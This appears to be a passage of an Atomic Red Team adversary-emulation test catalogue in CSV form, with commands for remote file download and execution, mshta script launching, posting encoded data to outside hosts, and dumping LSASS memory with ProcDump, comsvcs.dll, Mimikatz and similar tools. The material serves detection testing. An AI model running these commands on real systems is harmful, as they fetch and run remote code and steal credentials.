Invoke-WebRequest ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1105/src/T1105-download-file.vbs"" -OutFile ""#{vbscript_file}""

","input_arguments.vbscript_file.description: Full path to the VisualBasic downloading the file

input_arguments.vbscript_file.type: string

input_arguments.vbscript_file.default: PathToAtomicsFolder\T1105\src\T1105-download-file.vbs

"
T1105,Ingress Tool Transfer,Linux Download File and Run,bdc373c5-e9cf-4563-8a7b-a9ba720a90f3,"Utilize linux Curl to download a remote file, chmod +x it and run it.
",linux,,,"curl -sO #{remote_url}; chmod +x #{payload_name} | bash #{payload_name}
",sh,,,"rm #{payload_name}
",,,"input_arguments.remote_url.description: url of remote payload

input_arguments.remote_url.type: string

input_arguments.remote_url.default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1105/src/atomic.sh

input_arguments.payload_name.description: payload name

input_arguments.payload_name.type: string

input_arguments.payload_name.default: atomic.sh

"
T1105,Ingress Tool Transfer,Nimgrab - Transfer Files,b1729c57-9384-4d1c-9b99-9b220afb384e,"Use nimgrab.exe to download a file from the web. 
",windows,,,"cmd /c ""PathToAtomicsFolder\..\ExternalPayloads\nimgrab.exe"" #{remote_file} #{destination_path}
",command_prompt,,,"del #{destination_path} >nul 2>&1
",powershell,"dependencies.0.description: NimGrab must be installed on system.

dependencies.0.prereq_command: if (Test-Path ""PathToAtomicsFolder\..\ExternalPayloads\nimgrab.exe"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null
Invoke-WebRequest ""https://nim-lang.org/download/nim-1.6.6_x64.zip"" -Outfile ""PathToAtomicsFolder\..\ExternalPayloads\nim.zip""
Expand-Archive -Path ""PathToAtomicsFolder\..\ExternalPayloads\nim.zip"" -DestinationPath ""PathToAtomicsFolder\..\ExternalPayloads\nim"" -Force
Copy-Item ""PathToAtomicsFolder\..\ExternalPayloads\nim\nim-1.6.6\bin\nimgrab.exe"" ""PathToAtomicsFolder\..\ExternalPayloads\nimgrab.exe""

","input_arguments.remote_file.description: URL of file to copy

input_arguments.remote_file.type: url

input_arguments.remote_file.default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt

input_arguments.destination_path.description: Destination path to file

input_arguments.destination_path.type: path

input_arguments.destination_path.default: $env:TEMP\Atomic-license.txt

"
T1105,Ingress Tool Transfer,iwr or Invoke Web-Request download,c01cad7f-7a4c-49df-985e-b190dcf6a279,"Use 'iwr' or ""Invoke-WebRequest"" -URI argument to download a file from the web. Note: without -URI also works in some versions.
",windows,,,"powershell.exe iwr -URI #{remote_file} -Outfile #{local_path}
",command_prompt,True,,"del %temp%\Atomic-license.txt >nul 2>&1
",,,"input_arguments.remote_file.description: URL of file to copy

input_arguments.remote_file.type: url

input_arguments.remote_file.default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt

input_arguments.local_path.description: Local path to place file

input_arguments.local_path.type: path

input_arguments.local_path.default: %temp%\Atomic-license.txt

"
T1039,Data from Network Shared Drive,Copy a sensitive File over Administrative share with copy,6ed67921-1774-44ba-bac6-adb51ed60660,"Copy from sensitive File from the c$ of another LAN computer with copy cmd
https://twitter.com/SBousseaden/status/1211636381086339073",windows,,,copy \\#{remote}\C$\#{share_file} %TEMP%\#{local_file},command_prompt,True,,"del \\#{remote}\C$\#{share_file}
del %TEMP%\#{local_file}",powershell,"dependencies.0.description: Administrative share must exist on #{remote}

dependencies.0.prereq_command: if (Test-Path ""\\#{remote}\C$"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: Write-Host 'Please Enable ""C$"" share on #{remote}'

dependencies.1.description: ""\\#{remote}\C$\#{share_file}"" must exist on #{remote}

dependencies.1.prereq_command: if (Test-Path ""\\#{remote}\C$\#{share_file}"") {exit 0} else {exit 1}

dependencies.1.get_prereq_command: Out-File -FilePath ""\\#{remote}\C$\#{share_file}""

","input_arguments.remote.description: Remote server name

input_arguments.remote.type: string

input_arguments.remote.default: 127.0.0.1

input_arguments.share_file.description: Remote Path to the file

input_arguments.share_file.type: path

input_arguments.share_file.default: Windows\temp\Easter_Bunny.password

input_arguments.local_file.description: Local name

input_arguments.local_file.type: string

input_arguments.local_file.default: Easter_egg.password

"
T1039,Data from Network Shared Drive,Copy a sensitive File over Administrative share with Powershell,7762e120-5879-44ff-97f8-008b401b9a98,"Copy from sensitive File from the c$ of another LAN computer with powershell
https://twitter.com/SBousseaden/status/1211636381086339073",windows,,,"copy-item -Path ""\\#{remote}\C$\#{share_file}"" -Destination ""$Env:TEMP\#{local_file}""",powershell,True,,"Remove-Item -Path ""\\#{remote}\C$\#{share_file}""
Remove-Item -Path ""$Env:TEMP\#{local_file}""",powershell,"dependencies.0.description: Administrative share must exist on #{remote}

dependencies.0.prereq_command: if (Test-Path ""\\#{remote}\C$"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: Write-Host 'Please Enable ""C$"" share on #{remote}'

dependencies.1.description: ""\\#{remote}\C$\#{share_file}"" must exist on #{remote}

dependencies.1.prereq_command: if (Test-Path ""\\#{remote}\C$\#{share_file}"") {exit 0} else {exit 1}

dependencies.1.get_prereq_command: Out-File -FilePath ""\\#{remote}\C$\#{share_file}""

","input_arguments.remote.description: Remote server name

input_arguments.remote.type: string

input_arguments.remote.default: 127.0.0.1

input_arguments.share_file.description: Remote Path to the file

input_arguments.share_file.type: path

input_arguments.share_file.default: Windows\temp\Easter_Bunny.password

input_arguments.local_file.description: Local name

input_arguments.local_file.type: string

input_arguments.local_file.default: Easter_egg.password

"
T1132.001,Data Encoding: Standard Encoding,Base64 Encoded data.,1164f70f-9a88-4dff-b9ff-dc70e7bf0c25,"Utilizing a common technique for posting base64 encoded data.
",macos,linux,,"echo -n 111-11-1111 | base64
curl -XPOST #{base64_data}.#{destination_url}
",sh,,,,,,"input_arguments.destination_url.description: Destination URL to post encoded data.

input_arguments.destination_url.type: url

input_arguments.destination_url.default: redcanary.com

input_arguments.base64_data.description: Encoded data to post using fake Social Security number 111-11-1111.

input_arguments.base64_data.type: string

input_arguments.base64_data.default: MTExLTExLTExMTE=

"
T1132.001,Data Encoding: Standard Encoding,Base64 Encoded data (freebsd),2d97c626-7652-449e-a986-b02d9051c298,"Utilizing a common technique for posting base64 encoded data.
",linux,,,"echo -n 111-11-1111 | b64encode -r -
curl -XPOST #{base64_data}.#{destination_url}
",sh,,,,sh,"dependencies.0.description: Requires curl

dependencies.0.prereq_command: if [ -x ""$(command -v curl)"" ]; then exit 0; else exit 1; fi;      

dependencies.0.get_prereq_command: pkg install -y curl

","input_arguments.destination_url.description: Destination URL to post encoded data.

input_arguments.destination_url.type: url

input_arguments.destination_url.default: redcanary.com

input_arguments.base64_data.description: Encoded data to post using fake Social Security number 111-11-1111.

input_arguments.base64_data.type: string

input_arguments.base64_data.default: MTExLTExLTExMTE=

"
T1132.001,Data Encoding: Standard Encoding,XOR Encoded data.,c3ed6d2a-e3ad-400d-ad78-bbfdbfeacc08,"XOR encodes the data with a XOR key.
Reference - https://gist.github.com/loadenmb/8254cee0f0287b896a05dcdc8a30042f
",windows,,,"$plaintext = ([system.Text.Encoding]::UTF8.getBytes(""#{plaintext}""))
$key = ""#{key}""
$cyphertext =  @();
for ($i = 0; $i -lt $plaintext.Count; $i++) {
 $cyphertext += $plaintext[$i] -bxor $key[$i % $key.Length];
}
$cyphertext = [system.Text.Encoding]::UTF8.getString($cyphertext)
[System.Net.ServicePointManager]::Expect100Continue = $false
Invoke-WebRequest -Uri #{destination_url} -Method POST -Body $cyphertext -DisableKeepAlive
",powershell,,,,,,"input_arguments.destination_url.description: Destination URL to post encoded data.

input_arguments.destination_url.type: url

input_arguments.destination_url.default: example.com

input_arguments.plaintext.description: Plain text mimicking victim data sent to C2 server.

input_arguments.plaintext.type: string

input_arguments.plaintext.default: Path\n----\nC:\Users\victim

input_arguments.key.description: XOR key used for encoding the plaintext.

input_arguments.key.type: string

input_arguments.key.default: abcdefghijklmnopqrstuvwxyz123456

"
T1613,Container and Resource Discovery,Container and ResourceDiscovery,8a895923-f99f-4668-acf2-6cc59a44f05e,Adversaries may attempt to discover containers and other resources that are available within a containers environment.,containers,,,"docker build -t t1613  $PathtoAtomicsFolder/T1613/src/
docker run --name t1613_container  -d -t t1613
docker ps
docker stats --no-stream
docker inspect $(docker ps -l -q --filter ancestor=t1613)",sh,,,"docker stop t1613_container
docker rmi -f t1613_container",sh,"dependencies.0.description: Verify docker is installed.
dependencies.0.prereq_command: which docker

dependencies.0.get_prereq_command: if [ """" == ""`which docker`"" ]; then echo ""Docker Not Found""; if [ -n ""`which apt-get`"" ]; then sudo apt-get -y install docker ; elif [ -n ""`which yum`"" ]; then sudo yum -y install docker ; fi ; else echo ""Docker installed""; fi

dependencies.1.description: Verify docker service is running.
dependencies.1.prereq_command: sudo systemctl status docker  --no-pager

dependencies.1.get_prereq_command: sudo systemctl start docker

",
T1218.005,Signed Binary Proxy Execution: Mshta,Mshta executes JavaScript Scheme Fetch Remote Payload With GetObject,1483fab9-4f52-4217-a9ce-daa9d7747cae,"Test execution of a remote script using mshta.exe. Upon execution calc.exe will be launched.
",windows,,,"mshta.exe javascript:a=(GetObject('script:#{file_url}')).Exec();close();
",command_prompt,,,,,,"input_arguments.file_url.description: location of the payload

input_arguments.file_url.type: url

input_arguments.file_url.default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.005/src/mshta.sct

"
T1218.005,Signed Binary Proxy Execution: Mshta,Mshta executes VBScript to execute malicious command,906865c3-e05f-4acc-85c4-fbc185455095,"Run a local VB script to run local user enumeration powershell command.
This attempts to emulate what FIN7 does with this technique which is using mshta.exe to execute VBScript to execute malicious code on victim systems.
Upon execution, a new PowerShell windows will be opened that displays user information.
",windows,,,"mshta vbscript:Execute(""CreateObject(""""Wscript.Shell"""").Run """"powershell -noexit -file PathToAtomicsFolder\T1218.005\src\powershell.ps1"""":close"")
",command_prompt,,,,,,
T1218.005,Signed Binary Proxy Execution: Mshta,Mshta Executes Remote HTML Application (HTA),c4b97eeb-5249-4455-a607-59f95485cb45,"Execute an arbitrary remote HTA. Upon execution calc.exe will be launched.
",windows,,,"$var =Invoke-WebRequest ""#{hta_url}""
$var.content|out-file ""#{temp_file}""
mshta ""#{temp_file}""
start-sleep -s 15
stop-process -name ""calculator"" -Force
",powershell,,,"remove-item ""#{temp_file}"" -ErrorAction Ignore
",,,"input_arguments.temp_file.description: temp_file location for hta

input_arguments.temp_file.type: string

input_arguments.temp_file.default: $env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\T1218.005.hta

input_arguments.hta_url.description: URL to HTA file for execution

input_arguments.hta_url.type: string

input_arguments.hta_url.default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.005/src/T1218.005.hta

"
T1218.005,Signed Binary Proxy Execution: Mshta,Invoke HTML Application - Jscript Engine over Local UNC Simulating Lateral Movement,007e5672-2088-4853-a562-7490ddc19447,Executes an HTA Application using JScript script engine using local UNC path simulating lateral movement.,windows,,,Invoke-ATHHTMLApplication -HTAFilePath #{hta_file_path} -ScriptEngine #{script_engine} -AsLocalUNCPath -SimulateLateralMovement -MSHTAFilePath #{mshta_file_path},powershell,,,,,"dependencies.0.description: The AtomicTestHarnesses module must be installed and Invoke-ATHHTMLApplication must be exported in the module.
dependencies.0.prereq_command: $RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable
if (-not $RequiredModule) {exit 1}
if (-not $RequiredModule.ExportedCommands['Invoke-ATHHTMLApplication']) {exit 1} else {exit 0}
dependencies.0.get_prereq_command: Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force

","input_arguments.script_engine.description: Script Engine to use

input_arguments.script_engine.type: string

input_arguments.script_engine.default: JScript

input_arguments.hta_file_path.description: HTA file name and or path to be used

input_arguments.hta_file_path.type: string

input_arguments.hta_file_path.default: Test.hta

input_arguments.mshta_file_path.description: Location of mshta.exe

input_arguments.mshta_file_path.type: string

input_arguments.mshta_file_path.default: $env:windir\system32\mshta.exe

"
T1218.005,Signed Binary Proxy Execution: Mshta,Invoke HTML Application - Jscript Engine Simulating Double Click,58a193ec-131b-404e-b1ca-b35cf0b18c33,Executes an HTA Application using JScript script engine simulating double click.,windows,,,Invoke-ATHHTMLApplication -HTAFilePath #{hta_file_path} -ScriptEngine #{script_engine} -SimulateUserDoubleClick,powershell,,,,,"dependencies.0.description: The AtomicTestHarnesses module must be installed and Invoke-ATHHTMLApplication must be exported in the module.
dependencies.0.prereq_command: $RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable
if (-not $RequiredModule) {exit 1}
if (-not $RequiredModule.ExportedCommands['Invoke-ATHHTMLApplication']) {exit 1} else {exit 0}
dependencies.0.get_prereq_command: Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force

","input_arguments.script_engine.description: Script Engine to use

input_arguments.script_engine.type: string

input_arguments.script_engine.default: JScript

input_arguments.hta_file_path.description: HTA file name and or path to be used

input_arguments.hta_file_path.type: string

input_arguments.hta_file_path.default: Test.hta

"
T1218.005,Signed Binary Proxy Execution: Mshta,Invoke HTML Application - Direct download from URI,39ceed55-f653-48ac-bd19-aceceaf525db,Executes an HTA Application by directly downloading from remote URI.,windows,,,Invoke-ATHHTMLApplication -HTAUri #{hta_uri} -MSHTAFilePath #{mshta_file_path},powershell,,,,,"dependencies.0.description: The AtomicTestHarnesses module must be installed and Invoke-ATHHTMLApplication must be exported in the module.
dependencies.0.prereq_command: $RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable
if (-not $RequiredModule) {exit 1}
if (-not $RequiredModule.ExportedCommands['Invoke-ATHHTMLApplication']) {exit 1} else {exit 0}
dependencies.0.get_prereq_command: Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force

","input_arguments.mshta_file_path.description: Location of mshta.exe

input_arguments.mshta_file_path.type: string

input_arguments.mshta_file_path.default: $env:windir\system32\mshta.exe

input_arguments.hta_uri.description: URI to HTA

input_arguments.hta_uri.type: url

input_arguments.hta_uri.default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/24549e3866407c3080b95b6afebf78e8acd23352/atomics/T1218.005/src/T1218.005.hta

"
T1218.005,Signed Binary Proxy Execution: Mshta,Invoke HTML Application - JScript Engine with Rundll32 and Inline Protocol Handler,e7e3a525-7612-4d68-a5d3-c4649181b8af,"Executes an HTA Application with JScript Engine, Rundll32 and Inline Protocol Handler.",windows,,,Invoke-ATHHTMLApplication -ScriptEngine #{script_engine} -InlineProtocolHandler #{protocol_handler} -UseRundll32 -Rundll32FilePath #{rundll32_file_path},powershell,,,,,"dependencies.0.description: The AtomicTestHarnesses module must be installed and Invoke-ATHHTMLApplication must be exported in the module.
dependencies.0.prereq_command: $RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable
if (-not $RequiredModule) {exit 1}
if (-not $RequiredModule.ExportedCommands['Invoke-ATHHTMLApplication']) {exit 1} else {exit 0}
dependencies.0.get_prereq_command: Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force

","input_arguments.rundll32_file_path.description: Location of rundll32.exe

input_arguments.rundll32_file_path.type: path

input_arguments.rundll32_file_path.default: $env:windir\system32\rundll32.exe

input_arguments.script_engine.description: Script Engine to use

input_arguments.script_engine.type: string

input_arguments.script_engine.default: JScript

input_arguments.protocol_handler.description: Protocol Handler to use

input_arguments.protocol_handler.type: string

input_arguments.protocol_handler.default: About

"
T1218.005,Signed Binary Proxy Execution: Mshta,Invoke HTML Application - JScript Engine with Inline Protocol Handler,d3eaaf6a-cdb1-44a9-9ede-b6c337d0d840,Executes an HTA Application with JScript Engine and Inline Protocol Handler.,windows,,,Invoke-ATHHTMLApplication -ScriptEngine #{script_engine} -InlineProtocolHandler #{protocol_handler} -MSHTAFilePath #{mshta_file_path},powershell,,,,,"dependencies.0.description: The AtomicTestHarnesses module must be installed and Invoke-ATHHTMLApplication must be exported in the module.
dependencies.0.prereq_command: $RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable
if (-not $RequiredModule) {exit 1}
if (-not $RequiredModule.ExportedCommands['Invoke-ATHHTMLApplication']) {exit 1} else {exit 0}
dependencies.0.get_prereq_command: Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force

","input_arguments.mshta_file_path.description: Location of mshta.exe

input_arguments.mshta_file_path.type: path

input_arguments.mshta_file_path.default: $env:windir\system32\mshta.exe

input_arguments.script_engine.description: Script Engine to use

input_arguments.script_engine.type: string

input_arguments.script_engine.default: JScript

input_arguments.protocol_handler.description: Protocol Handler to use

input_arguments.protocol_handler.type: string

input_arguments.protocol_handler.default: About

"
T1218.005,Signed Binary Proxy Execution: Mshta,Invoke HTML Application - Simulate Lateral Movement over UNC Path,b8a8bdb2-7eae-490d-8251-d5e0295b2362,Executes an HTA Application with Simulate lateral movement over UNC Path.,windows,,,Invoke-ATHHTMLApplication -TemplatePE -AsLocalUNCPath -MSHTAFilePath #{mshta_file_path},powershell,,,,,"dependencies.0.description: The AtomicTestHarnesses module must be installed and Invoke-ATHHTMLApplication must be exported in the module.
dependencies.0.prereq_command: $RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable
if (-not $RequiredModule) {exit 1}
if (-not $RequiredModule.ExportedCommands['Invoke-ATHHTMLApplication']) {exit 1} else {exit 0}
dependencies.0.get_prereq_command: Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force

","input_arguments.mshta_file_path.description: Location of mshta.exe

input_arguments.mshta_file_path.type: string

input_arguments.mshta_file_path.default: $env:windir\system32\mshta.exe

"
T1218.005,Signed Binary Proxy Execution: Mshta,Mshta used to Execute PowerShell,8707a805-2b76-4f32-b1c0-14e558205772,"Use Mshta to execute arbitrary PowerShell. Example is from the 2021 Threat Detection Report by Red Canary.
",windows,,,"mshta.exe ""about:<hta:application><script language=""VBScript"">Close(Execute(""CreateObject(""""Wscript.Shell"""").Run%20""""powershell.exe%20-nop%20-Command%20Write-Host%20#{message};Start-Sleep%20-Seconds%20#{seconds_to_sleep}""""""))</script>'""
",command_prompt,,,,,,"input_arguments.message.description: Encoded message to include

input_arguments.message.type: string

input_arguments.message.default: Hello,%20MSHTA!

input_arguments.seconds_to_sleep.description: How many seconds to sleep/wait

input_arguments.seconds_to_sleep.type: integer

input_arguments.seconds_to_sleep.default: 5

"
T1003.001,OS Credential Dumping: LSASS Memory,Dump LSASS.exe Memory using ProcDump,0be2230c-9ab3-4ac2-8826-3199b9a0ebf8,"The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with Sysinternals
ProcDump.

Upon successful execution, you should see the following file created c:\windows\temp\lsass_dump.dmp.

If you see a message saying ""procdump.exe is not recognized as an internal or external command"", try using the  get-prereq_commands to download and install the ProcDump tool first.
",windows,,,"""#{procdump_exe}"" -accepteula -ma lsass.exe #{output_file}
",command_prompt,True,,"del ""#{output_file}"" >nul 2> nul
",powershell,"dependencies.0.description: ProcDump tool from Sysinternals must exist on disk at specified location (#{procdump_exe})

dependencies.0.prereq_command: if (Test-Path ""#{procdump_exe}"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null
Invoke-WebRequest ""https://download.sysinternals.com/files/Procdump.zip"" -OutFile ""PathToAtomicsFolder\..\ExternalPayloads\Procdump.zip""
Expand-Archive ""PathToAtomicsFolder\..\ExternalPayloads\Procdump.zip"" ""PathToAtomicsFolder\..\ExternalPayloads\Procdump"" -Force
New-Item -ItemType Directory (Split-Path ""#{procdump_exe}"") -Force | Out-Null
Copy-Item ""PathToAtomicsFolder\..\ExternalPayloads\Procdump\Procdump.exe"" ""#{procdump_exe}"" -Force

","input_arguments.output_file.description: Path where resulting dump should be placed

input_arguments.output_file.type: path

input_arguments.output_file.default: C:\Windows\Temp\lsass_dump.dmp

input_arguments.procdump_exe.description: Path of Procdump executable

input_arguments.procdump_exe.type: path

input_arguments.procdump_exe.default: PathToAtomicsFolder\..\ExternalPayloads\procdump.exe

"
T1003.001,OS Credential Dumping: LSASS Memory,Dump LSASS.exe Memory using comsvcs.dll,2536dee2-12fb-459a-8c37-971844fa73be,"The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with a built-in dll.

Upon successful execution, you should see the following file created $env:TEMP\lsass-comsvcs.dmp.
",windows,,,"C:\Windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).id $env:TEMP\lsass-comsvcs.dmp full
",powershell,True,,"Remove-Item $env:TEMP\lsass-comsvcs.dmp -ErrorAction Ignore
",,,
T1003.001,OS Credential Dumping: LSASS Memory,Dump LSASS.exe Memory using direct system calls and API unhooking,7ae7102c-a099-45c8-b985-4c7a2d05790d,"The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved using direct system calls and API unhooking in an effort to avoid detection. 
https://github.com/outflanknl/Dumpert
https://outflank.nl/blog/2019/06/19/red-team-tactics-combining-direct-system-calls-and-srdi-to-bypass-av-edr/
Upon successful execution, you should see the following file created C:\\windows\\temp\\dumpert.dmp.

If you see a message saying \""The system cannot find the path specified.\"", try using the  get-prereq_commands to download the  tool first.
",windows,,,"""#{dumpert_exe}""
",command_prompt,True,,"del C:\windows\temp\dumpert.dmp >nul 2> nul
",powershell,"dependencies.0.description: Dumpert executable must exist on disk at specified location (#{dumpert_exe})

dependencies.0.prereq_command: if (Test-Path ""#{dumpert_exe}"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
New-Item -ItemType Directory (Split-Path ""#{dumpert_exe}"") -Force | Out-Null
Invoke-WebRequest ""https://github.com/clr2of8/Dumpert/raw/5838c357224cc9bc69618c80c2b5b2d17a394b10/Dumpert/x64/Release/Outflank-Dumpert.exe"" -OutFile ""#{dumpert_exe}""

","input_arguments.dumpert_exe.description: Path of Dumpert executable

input_arguments.dumpert_exe.type: path

input_arguments.dumpert_exe.default: PathToAtomicsFolder\..\ExternalPayloads\Outflank-Dumpert.exe

"
T1003.001,OS Credential Dumping: LSASS Memory,Dump LSASS.exe Memory using NanoDump,dddd4aca-bbed-46f0-984d-e4c5971c51ea,"The NanoDump tool uses syscalls and an invalid dump signature to avoid detection.

https://github.com/helpsystems/nanodump

Upon successful execution, you should find the nanondump.dmp file in the temp directory
",windows,,,"PathToAtomicsFolder\..\ExternalPayloads\nanodump.x64.exe -w ""%temp%\nanodump.dmp""
",command_prompt,True,,"del ""%temp%\nanodump.dmp"" >nul 2> nul
",powershell,"dependencies.0.description: NanoDump executable must exist on disk at specified location (PathToAtomicsFolder\..\ExternalPayloads\nanodump.x64.exe)

dependencies.0.prereq_command: if (Test-Path PathToAtomicsFolder\..\ExternalPayloads\nanodump.x64.exe) {exit 0} else {exit 1}

dependencies.0.get_prereq_command: [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null
Invoke-WebRequest ""https://github.com/fortra/nanodump/blob/2c0b3d5d59c56714312131de9665defb98551c27/dist/nanodump.x64.exe"" -OutFile ""PathToAtomicsFolder\..\ExternalPayloads\nanodump.x64.exe"" 

",
T1003.001,OS Credential Dumping: LSASS Memory,Dump LSASS.exe Memory using Windows Task Manager,dea6c349-f1c6-44f3-87a1-1ed33a59a607,"The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with the Windows Task
Manager and administrative permissions.
",windows,,,,manual,,"1. Open Task Manager:
  On a Windows system this can be accomplished by pressing CTRL-ALT-DEL and selecting Task Manager or by right-clicking
  on the task bar and selecting ""Task Manager"".

2. Select lsass.exe:
  If lsass.exe is not visible, select ""Show processes from all users"". This will allow you to observe execution of lsass.exe
  and select it for manipulation.

3. Dump lsass.exe memory:
  Right-click on lsass.exe in Task Manager. Select ""Create Dump File"". The following dialog will show you the path to the saved file.
",,,,
T1003.001,OS Credential Dumping: LSASS Memory,Offline Credential Theft With Mimikatz,453acf13-1dbd-47d7-b28a-172ce9228023,"The memory of lsass.exe is often dumped for offline credential theft attacks. Adversaries commonly perform this offline analysis with
Mimikatz. This tool is available at https://github.com/gentilkiwi/mimikatz and can be obtained using the get-prereq_commands.
",windows,,,"""#{mimikatz_exe}"" ""sekurlsa::minidump #{input_file}"" ""sekurlsa::logonpasswords full"" exit
",command_prompt,True,,,powershell,"dependencies.0.description: Mimikatz must exist on disk at specified location (#{mimikatz_exe})

dependencies.0.prereq_command: if (Test-Path ""#{mimikatz_exe}"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr ""https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-FetchFromZip.ps1"" -UseBasicParsing) 
$releases = ""https://api.github.com/repos/gentilkiwi/mimikatz/releases""
$zipUrl = (Invoke-WebRequest $releases | ConvertFrom-Json)[0].assets.browser_download_url | where-object { $_.endswith("".zip"") }
$basePath = Split-Path ""#{mimikatz_exe}"" | Split-Path
Invoke-FetchFromZip $zipUrl ""x64/mimikatz.exe"" $basePath

dependencies.1.description: Lsass dump must exist at specified location (#{input_file})

dependencies.1.prereq_command: cmd /c ""if not exist #{input_file} (exit /b 1)""

dependencies.1.get_prereq_command: Write-Host ""Create the lsass dump manually using the steps in the previous test (Dump LSASS.exe Memory using Windows Task Manager)""

","input_arguments.input_file.description: Path of the Lsass dump

input_arguments.input_file.type: path

input_arguments.input_file.default: %tmp%\lsass.DMP

input_arguments.mimikatz_exe.description: Path of the Mimikatz binary

input_arguments.mimikatz_exe.type: string

input_arguments.mimikatz_exe.default: PathToAtomicsFolder\..\ExternalPayloads\x64\mimikatz.exe

"
T1003.001,OS Credential Dumping: LSASS Memory,LSASS read with pypykatz,c37bc535-5c62-4195-9cc3-0517673171d8,"Parses secrets hidden in the LSASS process with python. Similar to mimikatz's sekurlsa::

Python 3 must be installed, use the get_prereq_command's to meet the prerequisites for this test.

Successful execution of this test will display multiple usernames and passwords/hashes to the screen.
",windows,,,"pypykatz live lsa
",command_prompt,True,,,command_prompt,"dependencies.0.description: Computer must have python 3 installed

dependencies.0.prereq_command: py -3 --version >nul 2>&1
exit /b %errorlevel%

dependencies.0.get_prereq_command: echo ""Python 3 must be installed manually""

dependencies.1.description: Computer must have pip installed

dependencies.1.prereq_command: py -3 -m pip --version >nul 2>&1
exit /b %errorlevel%

dependencies.1.get_prereq_command: echo ""PIP must be installed manually""

dependencies.2.description: pypykatz must be installed and part of PATH

dependencies.2.prereq_command: pypykatz -h >nul 2>&1
exit /b %errorlevel%

dependencies.2.get_prereq_command: pip install pypykatz

",
T1003.001,OS Credential Dumping: LSASS Memory,Dump LSASS.exe Memory using Out-Minidump.ps1,6502c8f0-b775-4dbd-9193-1298f56b6781,"The memory of lsass.exe is often dumped for offline credential theft attacks. This test leverages a pure
powershell implementation that leverages the MiniDumpWriteDump Win32 API call.
Upon successful execution, you should see the following file created $env:TEMP\lsass_*.dmp.

Author of Out-Minidump: Matthew Graeber (@mattifestation)
",windows,,,"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null
try{ IEX (IWR 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1003.001/src/Out-Minidump.ps1') -ErrorAction Stop}
catch{ $_; exit $_.Exception.Response.StatusCode.Value__}
get-process lsass | Out-Minidump
",powershell,True,,"Remove-Item $env:TEMP\lsass_*.dmp -ErrorAction Ignore
",,,
T1003.001,OS Credential Dumping: LSASS Memory,Create Mini Dump of LSASS.exe using ProcDump,7cede33f-0acd-44ef-9774-15511300b24b,"The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with Sysinternals
ProcDump. This particular method uses -mm to produce a mini dump of lsass.exe

Upon successful execution, you should see the following file created c:\windows\temp\lsass_dump.dmp.

If you see a message saying ""procdump.exe is not recognized as an internal or external command"", try using the  get-prereq_commands to download and install the ProcDump tool first.
",windows,,,"""#{procdump_exe}"" -accepteula -mm lsass.exe #{output_file}
",command_prompt,True,,"del ""#{output_file}"" >nul 2> nul
",powershell,"dependencies.0.description: ProcDump tool from Sysinternals must exist on disk at specified location (#{procdump_exe})

dependencies.0.prereq_command: if (Test-Path ""#{procdump_exe}"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null
Invoke-WebRequest ""https://download.sysinternals.com/files/Procdump.zip"" -OutFile ""PathToAtomicsFolder\..\ExternalPayloads\Procdump.zip""
Expand-Archive ""PathToAtomicsFolder\..\ExternalPayloads\Procdump.zip"" ""PathToAtomicsFolder\..\ExternalPayloads\Procdump"" -Force
New-Item -ItemType Directory (Split-Path ""#{procdump_exe}"") -Force | Out-Null
Copy-Item ""PathToAtomicsFolder\..\ExternalPayloads\Procdump\Procdump.exe"" ""#{procdump_exe}"" -Force

","input_arguments.output_file.description: Path where resulting dump should be placed

input_arguments.output_file.type: path

input_arguments.output_file.default: C:\Windows\Temp\lsass_dump.dmp

input_arguments.procdump_exe.description: Path of Procdump executable

input_arguments.procdump_exe.type: path

input_arguments.procdump_exe.default: PathToAtomicsFolder\..\ExternalPayloads\procdump.exe

"
